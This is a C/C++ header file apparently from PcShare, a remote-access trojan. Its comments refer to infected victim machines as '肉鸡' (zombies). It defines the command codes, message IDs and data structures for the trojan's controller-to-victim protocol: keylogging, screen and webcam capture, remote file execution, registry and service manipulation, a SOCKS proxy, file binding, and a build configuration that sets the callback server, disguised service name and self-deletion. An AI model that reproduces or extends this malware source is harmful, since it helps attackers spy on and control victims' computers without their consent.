/************************************************************************/
/* 关于PcShare多语言版本策略说明（超级终端例外）
/* 多语言版约束条件：
/* (1) 肉鸡端ANSI编码;
/* (2) 控制端Unicode编码;
/* (3) 传输层统一使用ANSI编码;
/* (4) 传输层使用的结构体struct，肉鸡端编译成ANSI的，控制端将编译成Unicode的，
/*     且界面实现逻辑直接使用结构体struct中的TCHAR成员变量。
/* 
/* 实现策略：在MyServerTran的RecvDataWithCmd和SendDataWithCmd中统一实现
/*		控制端到肉鸡的Unicode到肉鸡端ANSI的转换，以及肉鸡到控制端的肉鸡端ANSI
/*		到Unicode的转换。
/*
/* 实现方法一：
/* (1) 在控制端为所有传输层的结构体struct再定义一份纯ANSI版的；
/* (2) 转换时new出一个同个数的纯ANSI版的结构体struct，并用它替换原来的Unicode版的；
/* (3) Delete掉Unicode版的结构体struct。
/*
/* 实现方法二：
/* (1) 直接使用原结构体struct，利用sizeof(wchar_t)==sizeof(char)*2的特性；
/* (2) 当做从控制端到肉鸡端的转换时，直接把结构体中的字符成员转成ANSI的存在原处，强制当成是ANSI的；
/* (3) 当做从肉鸡端到控制端的转换时，直接把结构体中的字符成员转成Unicode的存在原处，强制当成是Unicode的；
/* (4) 为保证肉鸡端和控制端的结构体的大小一致，控制端的字符成员统一除以sizeof(TCHAR);
/* (5) 为保证控制端有足够的大小存储，肉鸡端和控制端的字符成员统一乘以2;
/* (6) 虽然字符成员增大一倍，单由于增加的大部分是0，且传输层有压缩，影响不大，测试摘要如下：
/*     传输30个字节的字符串，
/*	   char buf[30]  ==> char buf[30*2]，经压缩后多传输10字节；
/*	   char buf[256]  ==> char buf[256*2]，经压缩后多传输16字节。
/*
/* 虽然方法二看出上去不够明朗，但减少了结构体的定义，减少了结构体的内存new与delete,
/* 实际编码量小，故决定采用方法二。
/* 
/* 结构体定义示例：
/* 原结构体：
/* 		typedef struct _PATHFILEITEM_
/* 		{
/* 			TCHAR m_FileName[256];
/* 		}PATHFILEITEM, *LPPATHFILEITEM;
/* 新结构体：
/* 		typedef struct _PATHFILEITEM_
/* 		{
/* 			TCHAR m_FileName[256*2/sizeof(TCHAR)];
/* 		}PATHFILEITEM, *LPPATHFILEITEM;
/*
/* 同时，为保证肉鸡端与控制端的结构体struct保持一致性，改为只引用一个。
/*
/* ××××国际版修改策略×××××× [9/17/2007 zhaiyinwei]
/************************************************************************/

/*
*	公共变量,函数定义
*/

#ifndef _PCINIT_
using namespace Gdiplus;
#endif

#define _VIP_

//消息定义
#define WM_CLIENTMAINRCLICK		WM_USER + 400		//用户右击鼠标
#define WM_RESIZE_WND			WM_USER + 401		//重新排列项目
#define WM_CLOSEITEM			WM_USER + 402		//客户关闭
#define WM_ICONINFO				WM_USER + 403		//图标信息
#define WM_LOGONEND				WM_USER + 404		//登录成功
#define WM_DATA_ARRIVED			WM_USER + 405		//Meat Client 的反馈信息到了
#define WM_GET_CMDTEXT			WM_USER + 406		//获得给Meat Client的指令
#define WM_STOP_DOWN			WM_USER + 407		//文件下载退出
#define WM_SETMYCURSOR			WM_USER + 408		//光标控制
#define WM_TREESELCHANGED		WM_USER + 409		//目录列表左视双击
#define WM_DIRRIGHTRCLICK		WM_USER + 410		//目录列表右视单击
#define WM_INSERTMYITEM			WM_USER + 411		//增加项目
#define WM_SHOWURL				WM_USER + 412		//显示URL
#define WM_TRANS_START			WM_USER + 413		//开始下载
#define WM_TRANS_END			WM_USER + 414		//下载结束
#define WM_TRANS_STATE			WM_USER + 415		//下载状态
#define	WM_TRANS_INSERT			WM_USER + 416		//新下载任务
#define WM_STARTTCP				WM_USER + 417		//侦听端口
#define WM_FILE_TRANS_START		WM_USER + 418		//增加文件下载列表
#define WM_REGLEFTDBCLICK		WM_USER + 419		//注册表树控件双击
#define WM_REGLEFTRCLICK		WM_USER + 420		//注册表树控件右键单击
#define WM_REGRIGHTRBCLICK		WM_USER + 421		//注册表编辑(右视单击)
#define WM_ONEFRAME				WM_USER + 422		//一帧图象
#define WM_INITFRAME			WM_USER + 423		//初始化屏幕
#define WM_CONNBREAK			WM_USER + 424		//连接中断
#define WM_GETSTR				WM_USER + 425		//得到字串
#define WM_CRCLICK				WM_USER + 426		//显示菜单
#define WM_CLIENT_CONNECT		WM_USER + 427		//连接建立
#define WM_TRANS_COMPLETE		WM_USER + 428		//通信完成
#define WM_DATA_COMPLETE		WM_USER + 429		//连接建立
#define WM_DELETEVIEW			WM_USER + 430		//文件传输完备
#define WM_KEEPALIVE			WM_USER + 431		//心跳
#define WM_TRANEVENT			WM_USER + 432		//读套接字数据
#define WM_INSERTLOGS			WM_USER + 433		//增加日志
#define WM_FINDFILE				WM_USER + 434		//查找文件
#define WM_NOFILETRAN			WM_USER + 435		//文件下载完备
#define WM_MULTINSERTBUF		WM_USER + 436		//音频增加缓冲
#define WM_UPDATEFILEINFO		WM_USER + 437		//更新文件信息
#define WM_CLOSE_CLIENT_THREAD	WM_USER + 438		//关闭客户端线程
#define WM_MAIN_CONNECT			WM_USER + 439		//客户主连接建立
#define WM_SETFILEDOWNHWND		WM_USER + 440		//文件下载窗口
#define WM_GETUPDATEDATA		WM_USER + 441		//取更新客户端文件数据
#define WM_ADD_NEW_FILE			WM_USER + 443		//增减下载文件列表
#define WM_DL_DELETE_VIEW		WM_USER + 444		//删除文件下载视
#define WM_CONNECT_EXIT			WM_USER + 445		//连接到中转服务器


#define WM_CONNECT_DMOD			7999				//主控连接

#define WM_CONNECT_MAIN			8000				//主控连接
#define WM_CONNECT_FRAM			8001				//屏幕控制
#define WM_CONNECT_FILE			8002				//文件管理
#define WM_CONNECT_PROC			8003				//进程管理
#define WM_CONNECT_SERV			8004				//服务管理
#define WM_CONNECT_KEYM			8005				//键盘监控
#define WM_CONNECT_MULT			8006				//视频监控
#define WM_CONNECT_TLNT			8007				//超级终端
#define WM_CONNECT_DL_FILE		8008				//文件传输
#define WM_CONNECT_UPDA			8009				//自动更新
#define WM_CONNECT_TURL			8010				//下载url文件
#define WM_CONNECT_UPLO			8011				//上传执行文件
#define WM_CONNECT_GDIP			8012				//下载gdiplus.dll
#define WM_CONNECT_QUER			8013				//心跳
#define WM_CONNECT_REGT			8014				//注册表管理
#define WM_CONNECT_CWND			8015				//窗口管理
#define WM_CONNECT_MESS			8016				//显示命令
#define WM_CONNECT_LINK			8017				//访问连接
#define WM_CONNECT_SOCKS		8018				//开启代理
#define WM_CONNECT_TWOO			8019				//第二个连接命令
#define WM_CONNECT_FIND			8020				//文件查找
#define WM_CONNECT_CMD			8021				//下载cmd.exe
#define WM_CONNECT_VIDEO		8022				//视频传输
#define WM_CONNECT_AUDIO		8023				//音频传输
#define WM_CONNECT_UP_FILE		8024				//上传文件
#define WM_CONNECT_GET_KEY		8025				//取键盘监控信息

#define PS_LOCAL_SENDCMD		9000				//发送命令到客户
#define PS_LOCAL_FILETRAN		9001				//新增文件下载
#define PS_LOCAL_SEND_MESS		9002				//发送信息到肉机
#define PS_LOCAL_SEND_LINK		9003				//通知肉机访问网页
#define PS_LOCAL_SEND_TURL		9004				//通知肉机现在文件
#define PS_LOCAL_SEND_UPDATE	9005				//通知更新客户端
#define PS_LOCAL_SEND_UPLOAD	9006				//通知更新客户端
#define PS_LOCAL_CHECK_FILE_DL	9007				//检查是否有文件下载
#define PS_LOCAL_SHOW_MESS		9008				//显示信息
#define PS_LOCAL_UPDATE_MOD		9010				//动态更新主控插件
#define PS_LOCAL_START_SOCKS	9011				//开启socks
#define PS_LOCAL_UPDATE_KEY		9012				//动态更新KEY插件

#define TRAN_DATA_LEN			1024 * 1024	* 20	//数据交换长度
#define _FLAG_SYSTEM_FILE_		0x59983712			//文件校验标志

#define PS_ENTRY_COMM_KEY		0xf7				//简单异或


#define PS_SOCKET_CONNECT		20001			//第一个连接

#define PS_TEST_DLL				0x1000
#define PS_NAKE_SERVICE			0x1001

#define PS_CLIENT_UNINSTALL		0x3000
#define PS_CLIENT_EXIT			0x3001

//字串资源

// 特殊处理 [9/19/2007 zhaiyinwei]

#define PS_TITLE				_T("PcShare")

#ifdef _VIP_
#define PS_VER_INFO				"会员版本"
#else
#define PS_VER_INFO				"免费版本"
#endif
#define PS_EXT_VER_INFO			"win7-9.2.4"

#define PS_FENZU				_T("分组列表")
#define PS_SHEZHI				_T("参数设置")
#define PS_FENZUZONGSHU			_T("分组总数")
#define PS_FENZUSUOYIN			_T("分组索引")
#define PS_PUTONGKEHUZU			_T("普通客户组")

#define PS_WARNING				_T("警告")
#define PS_CAOZUO				_T("操作")
#define PS_INFO_NOTE			_T("用户注释")		//用户注释信息
#define PS_INFO_VIEW			_T("用户分组")		//用户分组信息

//交易代码
#define CLIENT_PRO_UNINSTALL	30002				//卸载程序
#define CLIENT_SYSTEM_RESTART	30004				//重启机器
#define CLIENT_SYSTEM_SHUTDOWN	30005				//关闭机器

#define CLIENT_DISK_INFO		6001				//取磁盘信息
#define CLIENT_FILE_INFO		6002				//取文件信息
#define CLIENT_DIR_INFO			6003				//取目录信息
#define CLIENT_DIR_LIST			6004				//列举目录
#define CLIENT_FILE_DELETE		6005				//删除文件
#define CLIENT_CREATE_DIR		6006				//新建目录
#define CLIENT_RENAME			6007				//更名或新建
#define CLIENT_DISK_LIST		6008				//取磁盘列表
#define CLIENT_EXEC_FILE		6009				//远程运行程序
#define CLIENT_PROCESS_KILL		6010				//终止用户进程
#define CLIENT_REG_QUERY		6011				//查询指定键值
#define CLIENT_REG_DELETE_KEY	6012				//删除子键
#define CLIENT_REG_DELETE_VALUE 6014				//删除键值
#define CLIENT_REG_UPDATE_VALUE	6015				//更改键值
#define CLIENT_DOWN_FILE_LIST	6017				//客户目录拷贝列表
#define CLIENT_PROCESS_LIST		6018				//刷新进程列表
#define CLIENT_ENUM_SERVICES	6019				//列举服务
#define CLIENT_CONTROL_SERVICES	6020				//控制服务
#define CLIENT_CONFIG_SERVICES	6021				//更新服务属性
#define CLIENT_DELETE_SERVICE	6023				//删除服务
#define CLIENT_FIND_FILE		6024				//查找文件
#define CLIENT_ENUM_WINDOWS		6025				//枚举窗口
#define CLIENT_CONTROL_WINDOWS	6026				//控制窗口
#define CLIENT_FILE_TRAN		6027				//传输文件

#define NOT_FIND_ANY_FILE		7000				//找不到任何文件
#define GET_PROCESS_LIST_ERR	7001				//取进程列表失败
#define ENUM_SERVICES_FAIL		7002				//取服务列表失败
#define CONTROL_SERVICES_FAIL	7003				//控制服务失败
#define CONFIG_SERVICES_FAIL	7004				//更新服务状态失败
#define SERVICE_DELETE_ERR		7005				//删除服务失败
#define INVALID_COMMAND			7006				//无效命令
#define CAN_NOT_OPEN_FILE		7007				//无法打开文件
#define EXEC_FILE_FAIL			7008				//远程运行程序失败
#define RENAME_FAILE			7009				//更名失败
#define CREATE_DIR_FAILE		7010				//创建目录失败
#define COMMAND_PARAM_ERR		7011				//参数错误
#define REG_DELETE_KEY_ERR		7012				//删除子键失败
#define REG_RENAME_VALUE_ERR	7013				//更名键值名失败
#define REG_CREATE_VALUE_ERR	7014				//创建新键值失败
#define REG_EDIT_VALUE_ERR		7015				//更改键值失败
#define OPEN_REG_KEY_ERR		7016				//无法打开指定键值
#define CAN_NOT_CREATE_TMP_FILE 7017				//无法创建临时文件
#define KILL_PROCESS_ERR		7018				//终止进程失败
#define DL_FILE_LOSE			7019				//下载的文件不存在
#define UP_FILE_FAIL			7020				//远程机器文件已经被打开,无法创建文件
#define DL_FILE_LEN_ERR			7021				//下载的文件长度异常

#define PS_PROXY_SOCKS4			1			
#define PS_PROXY_SOCKS5			2

#define CMD_FRAME_MOUSE_STATE	1					//鼠标状态
#define CMD_FRAME_KEY_STATE		2					//键盘状态
#define CMD_FRAME_KEY_ALL		3					//发送CTRL+ALT+DEL

#define PS_UDP					1
#define PS_HTTP					2

#define PS_VER_ULONGLONG		0x1234567812345678

typedef enum tagWin32SysType{
   WindowsNT4,
   Windows2000,
   WindowsXP,
   Windows2003,
   Vista,
   Windows7
}Type;

typedef struct _SYSFILEINFO_
{
	UINT nVerifyFlag;
	UINT nExeFileLen;
	UINT nDllFileLen;
	UINT nModFileLen;
	UINT nSysFileLen;
	UINT nKeyFileLen;
}SYSFILEINFO, *LPSYSFILEINFO;

typedef struct _MOUSEINFO_
{
	WORD x;
	WORD y;
	WORD state;
	BYTE ch;
	BYTE cmd;
}MOUSEINFO,*LPMOUSEINFO;

typedef struct _REGINFO_
{
	DWORD m_NameLen;
	DWORD m_DataType;
	DWORD m_Datalen;
	BOOL  m_IsKey;
	TCHAR m_Name[256 * 2 / sizeof(TCHAR)];
	BYTE  m_Data[256 * 2];// BYTE直接把空间扩大一倍 [9/19/2007 zhaiyinwei]
}REGINFO, *LPREGINFO;

typedef struct _WINDOWITEM_
{
	TCHAR m_WndName[256 * 2 / sizeof(TCHAR)];
	TCHAR m_ProcName[256 * 2 / sizeof(TCHAR)];
	HWND  m_hWnd;
	UINT  m_CtrlType;
}WINDOWITEM, *LPWINDOWITEM;

// 仅控制端在使用，不是通讯用的结构 [9/19/2007 zhaiyinwei]
typedef struct _ATTRIBITEM_
{
	TCHAR m_AttribTitle[256];
	TCHAR m_AttribValue[256];
}ATTRIBITEM, *LPATTRIBITEM;

typedef struct _RENAMEFILEITEM_
{
	TCHAR m_OldFileName[256*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
	TCHAR m_NewFileName[256*2/sizeof(TCHAR)];
}RENAMEFILEITEM, *LPRENAMEFILEITEM;

//_PSREGINFO_下的 BYTE 类型不能再除以sizeof(TCHAR)，否则肉鸡端和控制端的结构大小不一致，
//因为中间会存Unicode字符串，所以乘以2 [9/19/2007 zhaiyinwei]
typedef struct _PSREGINFO_
{
	TCHAR	m_Key[1024*2/sizeof(TCHAR)];//  [9/18/2007 zhaiyinwei]
	TCHAR	m_ItemName[256*2/sizeof(TCHAR)];
	BYTE	m_ItemValue[1024*2];
	DWORD	m_ValueLen;
	DWORD	m_ItemType;
	HKEY	m_RootKey;	
}PSREGINFO, *LPPSREGINFO;

typedef struct _PATHFILEITEM_
{
	TCHAR m_FileName[256*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
}PATHFILEITEM, *LPPATHFILEITEM;

typedef struct _CONTROLSERVICES_
{
	TCHAR m_Name[256*2/sizeof(TCHAR)];
	DWORD m_Flag;
}CONTROLSERVICES, *LPCONTROLSERVICES;

// 仅控制端在使用，不是通讯用的结构 [9/19/2007 zhaiyinwei]
typedef struct _SAVEFILEINFO_
{
	TCHAR m_LocalPath[256];
	TCHAR m_RemotePath[256];
	TCHAR m_FileLen[28];
	TCHAR m_FilePoint[28];
}SAVEFILEINFO, *LPSAVEFILEINFO;

typedef struct _PROCESSLIST_
{
	DWORD th32ProcessID; 
	LONG  pcPriClassBase; 
	DWORD cntThreads; 
	TCHAR  szExeFile[256*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
}PROCESSLIST, *LPPROCESSLIST;

typedef struct _MYSERVICES_
{
	DWORD dwServiceType; 
	DWORD dwStartType; 
	DWORD dwErrorControl; 
	DWORD dwTagId; 
	TCHAR m_Name[260*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
	TCHAR m_Disp[260*2/sizeof(TCHAR)];
	TCHAR m_Status[20*2/sizeof(TCHAR)];
	TCHAR lpBinaryPathName[256*2/sizeof(TCHAR)]; 
	TCHAR lpLoadOrderGroup[256*2/sizeof(TCHAR)]; 
	TCHAR lpDependencies[256*2/sizeof(TCHAR)]; 
	TCHAR lpServiceStartName[256*2/sizeof(TCHAR)]; 
	TCHAR lpDisplayName[256*2/sizeof(TCHAR)]; 
	TCHAR lpDescribe[256*2/sizeof(TCHAR)];
	TCHAR lpPassword[256*2/sizeof(TCHAR)];
}MYSERVICES, *LPMYSERVICES;

typedef struct _INTERFILEINFO_
{
	BOOL			m_IsExec;
	BOOL			m_IsUpLoad;
	BOOL			m_Response;
	LARGE_INTEGER	m_FileLen;
	LARGE_INTEGER	m_FilePoint;
	HWND			hWnd;
	TCHAR			m_LocalFile[256*2/sizeof(TCHAR)];
	TCHAR			m_RemoteFile[256*2/sizeof(TCHAR)];
}INTERFILEINFO, *LPINTERFILEINFO;

typedef struct _CPFILEINFO_
{
	LARGE_INTEGER	m_FileLen;
	TCHAR			m_FileName[256*2/sizeof(TCHAR)];
}CPFILEINFO, *LPCPFILEINFO;

typedef struct _DIRINFO_
{
	WIN32_FILE_ATTRIBUTE_DATA m_FileData;
	int m_FileCount;
	int m_DirCount;
	ULONGLONG m_AllFileSize;
	TCHAR m_szFullName[256*2/sizeof(TCHAR)];
}DIRINFO, *LPDIRINFO;

typedef struct _FILEINFO_
{
	WIN32_FILE_ATTRIBUTE_DATA m_FileData;
	TCHAR m_szFullName[256*2/sizeof(TCHAR)];
}FILEINFO, *LPFILEINFO;

typedef struct _DISKINFO_
{
	int			m_DeviceType;
	ULONGLONG	FreeBytesAvailable;  
	ULONGLONG	TotalNumberOfBytes;   
	ULONGLONG	TotalNumberOfFreeBytes;
	TCHAR		m_Volume[128*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
	TCHAR		m_FileSys[128*2/sizeof(TCHAR)];
	TCHAR		m_Name[30*2/sizeof(TCHAR)];
}DISKINFO, *LPDISKINFO;

typedef struct _DIRFILELIST_
{
	WIN32_FILE_ATTRIBUTE_DATA m_FileData;
	TCHAR			m_ItemPath[256*2/sizeof(TCHAR)];//  [9/16/2007 zhaiyinwei]
}DIRFILELIST, *LPDIRFILELIST;

// 仅控制端在使用，不是通讯用的结构 [9/19/2007 zhaiyinwei]
typedef struct _MYICONINFO_
{
	TCHAR m_Ext[5];
	int  m_Index;
}MYICONINFO, *LPMYICONINFO;

typedef struct _CMDINFO_
{
	UINT	m_Command;
	HWND	m_Hwnd;
}CMDINFO, *LPCMDINFO;

// 仅控制端在使用，不是通讯用的结构 [9/19/2007 zhaiyinwei]
typedef struct _MYCHILDCMDINFO_
{
	CMDINFO m_Info;
	TCHAR	m_Id[256];
}MYCHILDCMDINFO, *LPMYCHILDCMDINFO;

typedef struct _MYUPLOADINFO_
{
	char m_FileExt[32];
	char m_Param[256];
	int  m_IsShow;
}MYUPLOADINFO, *LPMYUPLOADINFO;

typedef struct _MYINSERTDLFILEINFO_
{
	TCHAR m_Id[256];
	TCHAR m_Title[256];
	TCHAR m_LocalPath[256];
	TCHAR m_RemotePath[256];
}MYINSERTDLFILEINFO, *LPMYINSERTDLFILEINFO;

typedef struct _LOGININFOA_
{
	UINT		m_Cmd;				//连接命令
	DWORDLONG	m_UserId;			//用户标识
	UINT		m_CpuSpeed;			//CPU主频
	DWORDLONG	m_MemContent;		//内存容量
	UINT		m_ACP;				//ACP
	UINT		m_OEMCP;			//OEMCP
	UINT		m_IsVideo;			//是否有摄像头
	UINT		m_SysType;			//操作系统类型
	UINT		m_CpuCount;			//CPU数量
	HWND		m_hWnd;				//连接窗口
	TCHAR		m_Id[18*2/sizeof(TCHAR)];			//唯一标识
	TCHAR		m_Note[64*2/sizeof(TCHAR)];			//计算机注释
	TCHAR		m_PcName[64*2/sizeof(TCHAR)];		//机器名称
	TCHAR		m_Group[32*2/sizeof(TCHAR)];		//用户分组
	TCHAR		m_SoftVer[32*2/sizeof(TCHAR)];		//软件版本
}LOGININFO, *LPLOGININFO;

typedef struct _TCPCONNECTINFO_
{
	WSAPROTOCOL_INFO m_SocketInfo;
	LOGININFO		 m_SysInfo;
	TCHAR			 m_RealIp[256];
}TCPCONNECTINFO, *LPTCPCONNECTINFO;


// [9/19/2007 zhaiyinwei]
// 该结构仅在生成肉鸡文件时使用，不用来通讯
// 该结构改成ANSI版的更好
typedef struct _PSDLLINFO_
{

//定长
	UINT m_ServerPort;
	UINT m_DelayTime;
	UINT m_IsDel;
	UINT m_IsKeyMon;
	UINT m_PassWord;
	UINT m_DllFileLen;
	UINT m_SysFileLen;
	UINT m_ComFileLen;
	UINT m_CreateFlag;
	UINT m_DirAddr;

//变长
	char m_ServerAddr[256];		// TCHAR to char [9/19/2007 zhaiyinwei]
	char m_DdnsUrl[256];
	char m_Title[64];
	char m_SysName[24];
	char m_ServiceName[24];		//服务名称
	char m_ServiceTitle[256];	//服务描述
	char m_ServiceView[32];		//服务显示名称
	char m_SoftVer[32];			//软件版本
	char m_Group[32];			//用户分组
	
//客户端保存
	UINT m_IsSys;
	UINT m_ExtInfo;
	char m_ID[18];
	char m_ExeFilePath[256];
}PSDLLINFO, *LPPSDLLINFO;

typedef struct _MYSAVEFILEINFO_
{
	ULONGLONG	m_FindFlag;
	DWORD		m_Size;
}MYSAVEFILEINFO, *LPMYSAVEFILEINFO;

typedef struct _PROXYLOGININFO_
{
	UINT	m_Cmd;
	DWORD	m_Data;
}PROXYLOGININFO, *LPPROXYLOGININFO;

typedef struct _MYSOCKSINFO_
{
	WORD	m_Port;
	char	m_User[64];
	char	m_Pass[32];
	HANDLE	hExitEvent;
}MYSOCKSINFO, *LPMYSOCKSINFO;

#define P_CONNECT_CMD		5001
#define P_CONNECT_DATA		5002
#define P_CONNECT_SUCCESS	5003
#define P_CONNECT_ERROR		5004
#define P_CONNECT_ALIVE		5005

#define PS_START_WIN7		11001		//win7启动
#define PS_START_UPDATE		11002		//更新客户端
#define PS_START_FILECOMB	11003		//文件捆绑
#define PS_START_FILECOPY	11004		//文件捆绑拷贝

#define PS_USER_ID			0x3030303030303030			//VIP版本
extern TCHAR m_MainUrl[256];